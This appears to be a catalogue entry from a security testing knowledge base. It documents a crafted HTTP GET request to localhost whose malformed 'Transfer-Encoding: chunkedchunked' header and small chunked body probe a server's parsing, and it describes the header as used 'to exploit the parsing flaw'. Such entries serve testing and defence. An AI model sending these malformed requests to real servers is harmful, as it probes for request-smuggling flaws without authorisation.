---
data: "GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunkedchunked\r\n\r\n1\r\na\r\n0\r\n\r\n"
tags:
  - http-request
  - malformed-header
type: command
executor: http
platforms:
  - Web
id: ad1707b4-003e-462c-b5ae-56756cae4ad6
created_at: '2025-12-13T09:01:17.311Z'
updated_at: '2025-12-13T09:01:17.311Z'
verified: false
validated: true
submitted: true
---
# http-get-malformed-transfer-encoding

## Command

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunkedchunked

1
a
0


```

## Description

Sends an HTTP GET request with a malformed Transfer-Encoding header set to 'chunkedchunked' and a simple chunked body to test parsing flaws.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | localhost | Yes |
| `Transfer-Encoding` | Set to 'chunkedchunked' to exploit the parsing flaw | Yes |

## Examples

### Basic Usage

```http
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunkedchunked

1
a
0


```

## Expected Output

Server responds with JSON showing headers including the malformed Transfer-Encoding, body length 1, and body 'a'.

## Related

- [[procedures/Send-Crafted-HTTP-Request-with-Malformed-Transfer-Encoding]]
- [[tools/Node-js]]
